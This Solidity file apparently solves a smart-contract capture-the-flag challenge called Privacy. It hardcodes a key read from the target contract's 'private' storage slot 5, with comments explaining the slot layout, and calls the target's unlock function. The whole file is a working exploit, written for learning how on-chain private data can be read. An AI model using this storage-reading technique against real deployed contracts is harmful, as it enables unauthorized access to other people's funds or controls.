// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPrivacy {
    function unlock(bytes16 _key) external;
}

contract PrivacyBreaker {

    address constant privacyAddr = 0xF40D7c269727Bb059CF4A001656332c0365C3e71;
    bytes16 constant key = 0x19366c3ba22779d11bc1207109470830; // taken from running await web3.eth.getStorageAt((await contract.address), 5); in the console and using the first 16 bytes only
    /* 
        5 because 
            Slot 0 = locked
            Slot 1 = ID
            Slot 2 = flattening, denomination, awkwardness
            Slot 3 = data[0]
            Slot 4 = data[1]
            Slot 5 = data[2] <-- key value
            Slot 6 = data[3]
    */

    function unlockPrivacy() public {
        IPrivacy(privacyAddr).unlock(key);
    }
} 